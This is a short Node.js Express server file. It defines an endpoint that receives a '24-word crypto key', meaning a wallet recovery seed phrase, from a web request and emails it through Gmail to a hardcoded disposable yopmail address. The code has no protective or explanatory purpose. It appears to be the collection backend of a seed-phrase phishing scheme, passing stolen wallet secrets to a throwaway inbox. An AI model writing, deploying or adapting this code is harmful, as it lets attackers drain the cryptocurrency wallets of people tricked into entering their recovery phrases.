const express = require('express');
const bodyParser = require('body-parser');
const nodemailer = require('nodemailer');
const dotenv = require('dotenv').config();

const app = express();
const port = process.env.PORT || 3000;

// Body parser middleware
app.use(bodyParser.json());

// Endpoint to receive the 24-word crypto key
app.post('/send-crypto-key', async (req, res) => {
  const cryptoKey = req.body.cryptoKey;

  // // Ensure that environment variables are set correctly
  // const toEmail = process.env.TO_EMAIL;
  // const emailNodeMailer = process.env.EMAIL_NODEMAILER;
  // const passwordNodeMailer = process.env.PASSWORD_NODEMAILER;

  // Create a Nodemailer transporter
  const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: process.env.EMAIL_NODEMAILER,
      pass: process.env.PASSWORD_NODEMAILER,
    },
  });

  // Email message
  const mailOptions = {
    from: process.env.EMAIL_NODEMAILER,
    to: "fred@yopmail.com",
    subject: 'Crypto Key',
    text: `Here is the 24-word crypto key: ${cryptoKey}`,
  };

  try {
    // Send email
    const info = await transporter.sendMail(mailOptions);
    console.log('Email sent:', info.response);
    res.status(200).send('Email sent successfully');
  } catch (error) {
    console.error('Error sending email:', error);
    res.status(500).send('Error sending email');
  }
});

app.listen(port, () => {
  console.log(`Server is running on port ${port}`);
});
